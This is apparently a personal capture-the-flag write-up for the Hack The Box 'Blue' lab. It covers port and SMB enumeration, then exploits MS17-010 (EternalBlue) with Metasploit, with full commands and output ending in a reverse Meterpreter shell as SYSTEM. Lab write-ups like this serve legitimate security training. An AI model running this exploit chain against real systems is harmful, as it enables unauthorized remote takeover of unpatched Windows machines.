---
tags:
  - eternalblue
  - ms17-010
group: Windows
---
![](https://labs.hackthebox.com/storage/avatars/52e077ae40899ab8b024afd51cb29b1c.png)

- Machine : https://app.hackthebox.com/machines/Blue
- Reference : https://0xdf.gitlab.io/2021/05/11/htb-blue.html
- Solved : 2024.12.25. (Wed) (Takes 1day)

## Summary
---

1. **Initial Reconnaissance**
    - **Port Scanning**:
        - Performed a quick scan revealing open ports: 135, 139, 445, 49152–49157.
        - A detailed Nmap scan identified SMB (`445`) with `Windows 7 Professional SP1`.
        - The system was part of the `WORKGROUP` domain.
    - **SMB Enumeration**:
        - Enumerated shares (`ADMIN$`, `C$`, `IPC$`, `Share`, `Users`) using `smbclient`.
        - No valuable files or information were found in accessible shares.
        
2. **Vulnerability Identification**
    - Used `nmap` with the `vuln` script to check for known SMB vulnerabilities.
    - **MS17-010** (EternalBlue) was identified as a critical vulnerability on the target.
    
3. **Exploitation**
    - Used `msfconsole` to exploit `MS17-010`:
        - Selected the `exploit/windows/smb/ms17_010_eternalblue` module.
        - Set `LHOST` to the attacker's IP and `RHOSTS` to the target's IP.
        - Verified the target was vulnerable and launched the exploit.
        - Successfully executed the payload and obtained a `Meterpreter` shell.
        
4. **Privilege Escalation**
    - Gained `NT AUTHORITY\SYSTEM` access on the target machine using the EternalBlue exploit.

### Key Techniques:

- **Port Scanning**: Quick and detailed Nmap scans to identify open services.
- **Enumeration**: Explored SMB shares for sensitive information.
- **Vulnerability Assessment**: Used Nmap scripts to identify exploitable vulnerabilities.
- **Exploitation**: Leveraged `Metasploit` for automated exploitation of MS17-010.
- **Privilege Escalation**: Directly achieved SYSTEM-level access through EternalBlue.

---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ./port-scan.sh 10.10.10.40
Performing quick port scan on 10.10.10.40...
Found open ports: 135,139,445,21717,22956,22966,24063,31603,32066,42530,49152,49153,49154,49155,49156,49157,55904,63283
Performing detailed scan on 10.10.10.40...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-25 03:03 EST
Nmap scan report for 10.10.10.40
Host is up (0.13s latency).

PORT      STATE  SERVICE      VERSION
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open   msrpc        Microsoft Windows RPC
49153/tcp open   msrpc        Microsoft Windows RPC
49154/tcp open   msrpc        Microsoft Windows RPC
49155/tcp open   msrpc        Microsoft Windows RPC
49156/tcp open   msrpc        Microsoft Windows RPC
49157/tcp open   msrpc        Microsoft Windows RPC
55904/tcp closed unknown
63283/tcp closed unknown
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 3s, deviation: 2s, median: 1s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-12-25T08:04:54+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-12-25T08:04:51
|_  start_date: 2024-12-25T08:01:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.78 seconds
```

- rpc(135), smb(139,445) ports are open.

### smb(445)

```vbnet
┌──(kali㉿kali)-[~/htb]
└─$ smbclient -L 10.10.10.40 
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

5 shares are found.
Let's open 2 unusual shares.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ smbclient \\\\10.10.10.40\\Share
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> 
smb: \> ls
  .                                   D        0  Fri Jul 14 09:48:44 2017
  ..                                  D        0  Fri Jul 14 09:48:44 2017

4692735 blocks of size 4096. 593104 blocks available
smb: \> exit

┌──(kali㉿kali)-[~/htb]
└─$ smbclient \\\\10.10.10.40\\Users
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Jul 21 02:56:23 2017
  ..                                 DR        0  Fri Jul 21 02:56:23 2017
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Public                             DR        0  Tue Apr 12 03:51:29 2011

4692735 blocks of size 4096. 593104 blocks available
```

Nothing in `Share`, and `Users` share doesn't have anything useful.


# Shell as `SYSTEM`

### MS17-010

Given that the OS is `Windows 7` and SMB is open, maybe `MS17-010` will be working.
Let's try to find vulnerability of this SMB version.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ nmap -p 445 -script vuln 10.10.10.40 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-25 03:19 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.40
Host is up (0.13s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 50.72 seconds
```

It says the target is vulnerable to `MS17-010`!
Let's use `msfconsole` for the exploit.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ msfconsole -q
msf6 > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce                                    
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'                                                      

msf6 > use 2
[*] Additionally setting TARGET => Windows 7
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https
                                             ://docs.metasploit.com/docs/u
                                             sing-metasploit/basics/using-
                                             metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain
                                              to use for authentication. O
                                             nly affects Windows Server 20
                                             08 R2, Windows 7, Windows Emb
                                             edded Standard 7 target machi
                                             nes.
   SMBPass                         no        (Optional) The password for t
                                             he specified username
   SMBUser                         no        (Optional) The username to au
                                             thenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture
                                             matches exploit Target. Only
                                             affects Windows Server 2008 R
                                             2, Windows 7, Windows Embedde
                                             d Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches ex
                                             ploit Target. Only affects Wi
                                             ndows Server 2008 R2, Windows
                                              7, Windows Embedded Standard
                                              7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh,
                                         thread, process, none)
   LHOST     192.168.45.131   yes       The listen address (an interface m
                                        ay be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows 7



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.14.14:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (201798 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.40:49158) at 2024-12-25 03:22:41 -0500
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

I got SYSTEM's shell!